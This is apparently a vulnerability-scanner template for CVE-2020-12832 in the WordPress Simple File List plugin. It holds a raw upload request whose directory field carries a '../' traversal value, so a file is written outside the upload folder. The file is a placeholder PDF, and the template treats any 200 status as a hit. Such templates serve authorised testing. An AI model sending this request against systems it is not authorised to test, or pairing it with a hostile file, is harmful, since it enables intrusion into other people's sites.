id: CVE-2020-12832

info:
  name:  WordPress Simple File List - Path Traversal
  author: riteshs4hu
  severity: Critical
  description: |
    Simple File List plugin allows path traversal via file upload, enabling files to be written outside the upload directory.
  reference:
    - https://wpscan.com/vulnerability/422360b9-4c70-4fd9-9833-375f1294bd7a/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-12832
    cwe-id: CWE-22
    cpe: cpe:2.3:a:simplefilelist:simple-file-list::::::wordpress::*
  metadata:
    verified: true
    max-request: 1
    vendor: Simple File List
    product: Simple File List WordPress Plugin
  tags: wordpress, wp-plugin, traversal, authenticated, cve

requests:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en-GB,en;q=0.9
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Accept: */*
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/my-simple-file-list-page/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Content-Disposition: form-data; name="action"

        sfl_upload_job
        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Content-Disposition: form-data; name="file"; filename="pdf1.pdf"
        Content-Type: application/pdf

        %PDF-1.7
        1 0 obj
        << /Pages 1 0 R >>
        %% Insert your safe PDF payload here
        endobj
        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Content-Disposition: form-data; name="eeSFL_ID"

        1
        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Content-Disposition: form-data; name="eeSFL_FileUploadDir"

        wp-content%2Fuploads%2Fsimple-file-list%2F..%2F
        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ
        Content-Disposition: form-data; name="ee-simple-file-list-upload"

        be9c41e1ba
        ------WebKitFormBoundarytA7kTuCe4IHDaUBZ--

    matchers:
      - type: status
        status:
          - 200
